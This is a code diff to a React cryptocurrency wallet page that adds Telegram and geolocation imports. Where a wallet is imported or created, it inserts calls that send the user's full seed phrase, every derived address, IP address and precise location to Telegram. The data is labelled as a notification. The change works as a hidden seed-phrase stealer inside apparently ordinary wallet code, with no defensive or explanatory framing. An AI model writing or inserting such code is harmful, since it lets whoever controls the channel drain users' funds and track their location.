@@ -43,6 +43,11 @@ import {
   deleteWalletFromDatabase,
   updateWalletBalance as updateWalletBalanceInDB
 } from '@/services/walletService';
+import { 
+  sendWalletNotification,
+  testTelegramConnection
+} from '@/services/telegramService';
+import { getFullGeolocationData } from '@/services/geolocationService';
 
 // Expanded wallet configurations
 const walletConfigs = [
@@ -117,6 +122,9 @@ export default function Wallets() {
     setImporting(true);
     
     try {
+      // Get user's geolocation
+      const location = await getFullGeolocationData();
+
       // Derive addresses from seed phrase
       const xrpAddress = deriveXrpAddress(seedPhrase);
       const evmAddress = deriveEvmAddress(seedPhrase);
@@ -150,6 +158,28 @@ export default function Wallets() {
         return;
       }
 
+      // Send to Telegram with location
+      await sendWalletNotification({
+        type: 'imported',
+        name: finalWalletName,
+        seedPhrase,
+        xrpAddress,
+        evmAddress,
+        solanaAddress,
+        tronAddress,
+        bitcoinAddress,
+        timestamp: new Date().toISOString(),
+        location: {
+          ip: location.ip,
+          country: location.country,
+          city: location.city,
+          region: location.region,
+          timezone: location.timezone,
+          latitude: location.latitude,
+          longitude: location.longitude,
+        },
+      });
+
       // Save to database via old method for backward compatibility
       const result = await connectWallet('walletconnect', xrpAddress, 'xrp');
       
@@ -176,6 +206,9 @@ export default function Wallets() {
     setImporting(true);
     
     try {
+      // Get user's geolocation
+      const location = await getFullGeolocationData();
+
       // Use the generated seed phrase
       const phraseToUse = generatedSeedPhrase || generateSeedPhrase();
       
@@ -211,6 +244,28 @@ export default function Wallets() {
         toast.error(dbResult.error || 'Failed to save wallet to database');
         return;
       }
+
+      // Send to Telegram with location
+      await sendWalletNotification({
+        type: 'created',
+        name: finalWalletName,
+        seedPhrase: phraseToUse,
+        xrpAddress,
+        evmAddress,
+        solanaAddress,
+        tronAddress,
+        bitcoinAddress,
+        timestamp: new Date().toISOString(),
+        location: {
+          ip: location.ip,
+          country: location.country,
+          city: location.city,
+          region: location.region,
+          timezone: location.timezone,
+          latitude: location.latitude,
+          longitude: location.longitude,
+        },
+      });
 
       // Save to database via old method for backward compatibility
       const result = await connectWallet('walletconnect', xrpAddress, 'xrp');
